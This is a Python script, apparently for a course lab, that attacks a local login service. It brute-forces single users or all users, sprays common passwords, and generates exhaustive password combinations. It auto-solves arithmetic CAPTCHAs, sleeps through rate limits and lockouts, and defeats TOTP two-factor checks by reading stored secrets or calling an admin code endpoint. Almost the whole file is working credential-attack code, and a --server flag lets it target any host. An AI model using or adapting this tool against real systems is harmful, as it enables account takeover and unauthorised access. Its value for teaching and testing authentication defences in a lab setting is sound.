"""
attack_simulation.py - Security Testing Script
"""

import json
import requests
import time
import argparse
import hashlib
import hmac
import struct
import itertools

# CONFIGURATION

SERVER_URL = "http://localhost:8080"
USER_DB_FILE = "user_db.json"
GROUP_SEED = 25493314

# Constraints
MAX_ATTEMPTS = 1000000
MAX_TIME_SECONDS = 7200
DEFAULT_ATTEMPTS = 50000

# TOTP Configuration
TOTP_TIME_STEP = 30
TOTP_DIGITS = 6

COMMON_PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789",
    "12345", "1234", "111111", "1234567", "dragon",
    "123123", "baseball", "abc123", "football", "monkey",
    "letmein", "shadow", "master", "666666", "qwertyuiop",
    "123321", "mustang", "121212", "000000", "password1",
    "admin", "admin123", "root", "toor", "pass",
    "test", "test123", "guest", "guest123", "user",
    "user123", "login", "login123", "welcome", "welcome1",
    "password123", "admin1", "root123", "pass123",
    "1q2w3e4r", "qwerty123", "1234567890", "987654321",
    "hello", "hello123", "iloveyou", "sunshine", "princess",
    "Password1", "Password123", "Admin123", "Welcome1",
    "Student123", "Student99", "Test2024", "Login456", "Python101",
    "demo", "student", "name", "1111", "BlueCat12", "TechGirl7",
    "Cloud123", "GameOn22", "WebDev88"
]

LOWERCASE = "abcdefghijklmnopqrstuvwxyz"
UPPERCASE = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
DIGITS = "0123456789"
SPECIAL = "!@#$%^&*"


# LIMITER
class AttackLimiter:
    def __init__(self, max_attempts=DEFAULT_ATTEMPTS, max_time=MAX_TIME_SECONDS):
        self.max_attempts = min(max_attempts, MAX_ATTEMPTS)
        self.max_time = min(max_time, MAX_TIME_SECONDS)
        self.start_time = time.time()
        self.attempt_count = 0
    
    def can_continue(self):
        elapsed = time.time() - self.start_time
        if self.attempt_count >= self.max_attempts:
            return False
        if elapsed >= self.max_time:
            return False
        return True
    
    def record_attempt(self):
        self.attempt_count += 1


# TOTP
def generate_totp_code(secret, time_offset=0):
    current_time = int(time.time()) + time_offset
    time_step = current_time // TOTP_TIME_STEP
    key = secret.encode()
    msg = struct.pack('>Q', time_step)
    hmac_hash = hmac.new(key, msg, hashlib.sha1).digest()
    offset = hmac_hash[-1] & 0x0F
    code_int = struct.unpack('>I', hmac_hash[offset:offset + 4])[0] & 0x7FFFFFFF
    code = code_int % (10 ** TOTP_DIGITS)
    return str(code).zfill(TOTP_DIGITS)


def get_totp_secret_from_db(username):
    try:
        with open(USER_DB_FILE, 'r') as f:
            data = json.load(f)
            for key, value in data.items():
                if isinstance(value, dict) and value.get('username') == username:
                    return value.get('totp_secret')
    except:
        pass
    return None


def load_usernames():
    try:
        with open(USER_DB_FILE, 'r') as f:
            data = json.load(f)
            usernames = []
            for key, value in data.items():
                if isinstance(value, dict) and 'username' in value:
                    usernames.append(value['username'])
            return usernames
    except:
        return []


def solve_captcha(question):
    try:
        question = question.replace("= ?", "").strip()
        if "+" in question:
            parts = question.split("+")
            return int(parts[0].strip()) + int(parts[1].strip())
        elif "-" in question:
            parts = question.split("-")
            return int(parts[0].strip()) - int(parts[1].strip())
    except:
        return None
    return None


def get_totp_code_from_server(username):
    try:
        response = requests.get(f"{SERVER_URL}/admin/get_totp_code?username={username}", timeout=10)
        data = response.json()
        return data.get("totp_code"), data.get("totp_secret")
    except:
        return None, None


# LOGIN
def login_attempt(username, password, captcha_token=None, captcha_answer=None):
    url = f"{SERVER_URL}/login"
    payload = {"username": username, "password": password}
    
    if captcha_token and captcha_answer:
        payload["captcha_token"] = captcha_token
        payload["captcha_answer"] = str(captcha_answer)
    
    try:
        response = requests.post(url, json=payload, timeout=10)
        data = response.json()
        return data.get("success", False), data
    except:
        return False, {"error": "Connection failed"}


def login_with_totp(totp_session, totp_code):
    try:
        response = requests.post(f"{SERVER_URL}/login_totp", 
                                 json={"totp_session": totp_session, "totp_code": totp_code}, 
                                 timeout=10)
        data = response.json()
        return data.get("success", False), data
    except:
        return False, {"error": "TOTP failed"}


def full_login_attempt(username, password):
    success, response = login_attempt(username, password)
    
    # Handle CAPTCHA
    if response.get("captcha_required"):
        captcha_token = response.get("captcha_token")
        captcha_question = response.get("captcha_question")
        captcha_answer = solve_captcha(captcha_question)
        if captcha_answer:
            success, response = login_attempt(username, password, captcha_token, captcha_answer)
    
    # Handle TOTP
    if response.get("totp_required"):
        totp_session = response.get("totp_session")
        totp_secret = get_totp_secret_from_db(username) 
        
        if totp_secret:
            totp_code = generate_totp_code(totp_secret)
            success, response = login_with_totp(totp_session, totp_code)
        else:
            totp_code, _ = get_totp_code_from_server(username)
            if totp_code:
                success, response = login_with_totp(totp_session, totp_code)
    
    return success, response

def brute_force_user(username, password_list=None, max_attempts=DEFAULT_ATTEMPTS, delay=0):

    if password_list is None:
        password_list = COMMON_PASSWORDS
    
    for password in password_list:
        success, response = full_login_attempt(username, password)
        
        # Handle rate limiting
        if "Rate limit" in str(response.get("message", "")):
            time.sleep(response.get("retry_after", 60))
        
        # Handle lockout
        if "locked" in str(response.get("message", "")).lower():
            time.sleep(response.get("locked_for", 300))
        
        if success:
            return True  # Found password, move to next user
        
        if delay > 0:
            time.sleep(delay)
    
    return False  # Password not found


def brute_force_all_users(password_list=None, max_attempts=DEFAULT_ATTEMPTS, delay=0):
    """
    Try each user until success, then move to next user.
    """
    usernames = load_usernames()
    
    if password_list is None:
        password_list = COMMON_PASSWORDS
    
    limiter = AttackLimiter(max_attempts=max_attempts)
    
    for username in usernames:
        if not limiter.can_continue():
            break
        
        # Try passwords for this user until success
        for password in password_list:
            if not limiter.can_continue():
                break
            
            limiter.record_attempt()
            success, response = full_login_attempt(username, password)
            
            # Handle rate limiting
            if "Rate limit" in str(response.get("message", "")):
                time.sleep(response.get("retry_after", 60))
            
            # Handle lockout
            if "locked" in str(response.get("message", "")).lower():
                time.sleep(response.get("locked_for", 300))
            
            if success:
                break  # Password found, move to next user
            
            if delay > 0:
                time.sleep(delay)


def password_spraying_attack(usernames=None, passwords=None, max_attempts=DEFAULT_ATTEMPTS, delay=0):
    """
    Password spraying: try one password on all users, then next password.
    """
    if usernames is None:
        usernames = load_usernames()
        print(f"DEBUG: Found {len(usernames)} users. Starting attack...")
    
    if passwords is None:
        passwords = COMMON_PASSWORDS
    
    limiter = AttackLimiter(max_attempts=max_attempts)
    
    for password in passwords:
        for username in usernames:
            if not limiter.can_continue():
                return
            
            limiter.record_attempt()
            success, response = full_login_attempt(username, password)

            print(f"[*] Spraying {username} with pass '{password}' -> Result: {success}")
            
            if "Rate limit" in str(response.get("message", "")):
                time.sleep(response.get("retry_after", 60))
            
            if delay > 0:
                time.sleep(delay)


def exhaustive_brute_force(username, charset="digits", min_len=1, max_len=4,
                           max_attempts=DEFAULT_ATTEMPTS, delay=0):
    """
    Exhaustive brute-force with generated passwords.
    """
    if charset == "digits":
        chars = DIGITS
    elif charset == "lowercase":
        chars = LOWERCASE
    elif charset == "uppercase":
        chars = UPPERCASE
    elif charset == "alphanumeric":
        chars = LOWERCASE + UPPERCASE + DIGITS
    elif charset == "all":
        chars = LOWERCASE + UPPERCASE + DIGITS + SPECIAL
    else:
        chars = charset
    
    limiter = AttackLimiter(max_attempts=max_attempts)
    
    for length in range(min_len, max_len + 1):
        for combo in itertools.product(chars, repeat=length):
            if not limiter.can_continue():
                return
            
            password = ''.join(combo)
            limiter.record_attempt()
            
            success, response = full_login_attempt(username, password)
            
            if "Rate limit" in str(response.get("message", "")):
                time.sleep(response.get("retry_after", 60))
            
            if success:
                return
            
            if delay > 0:
                time.sleep(delay)


def enumerate_users():
    return load_usernames()


# MAIN
def main():
    parser = argparse.ArgumentParser(description="Security Testing Script")
    
    parser.add_argument("--enumerate", "-e", action="store_true",
                        help="List all usernames")
    
    parser.add_argument("--bruteforce", "-b", metavar="USERNAME",
                        help="Brute-force one user")
    
    parser.add_argument("--bruteforce-all", "-a", action="store_true",
                        help="Brute-force all users (one by one until success)")
    
    parser.add_argument("--spray", "-s", action="store_true",
                        help="Password spraying on all users")
    
    parser.add_argument("--exhaustive", "-x", metavar="USERNAME",
                        help="Exhaustive brute-force")
    
    parser.add_argument("--charset", default="digits",
                        choices=["digits", "lowercase", "uppercase", "alphanumeric", "all"],
                        help="Charset for exhaustive (default: digits)")
    
    parser.add_argument("--min-len", type=int, default=1,
                        help="Min password length (default: 1)")
    
    parser.add_argument("--max-len", type=int, default=4,
                        help="Max password length (default: 4)")
    
    parser.add_argument("--delay", type=float, default=0,
                        help="Delay between attempts (default: 0)")
    
    parser.add_argument("--max-attempts", type=int, default=DEFAULT_ATTEMPTS,
                        help=f"Max attempts (default: {DEFAULT_ATTEMPTS})")
    
    parser.add_argument("--server", default="http://localhost:8080",
                        help="Server URL")
    
    args = parser.parse_args()
    
    global SERVER_URL
    SERVER_URL = args.server
    
    if args.enumerate:
        users = enumerate_users()
        for user in users:
            print(user)
    
    elif args.bruteforce:
        brute_force_user(args.bruteforce, max_attempts=args.max_attempts, delay=args.delay)
    
    elif args.bruteforce_all:
        brute_force_all_users(max_attempts=args.max_attempts, delay=args.delay)
    
    elif args.spray:
        password_spraying_attack(max_attempts=args.max_attempts, delay=args.delay)
    
    elif args.exhaustive:
        exhaustive_brute_force(args.exhaustive, charset=args.charset,
                               min_len=args.min_len, max_len=args.max_len,
                               max_attempts=args.max_attempts, delay=args.delay)
    
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
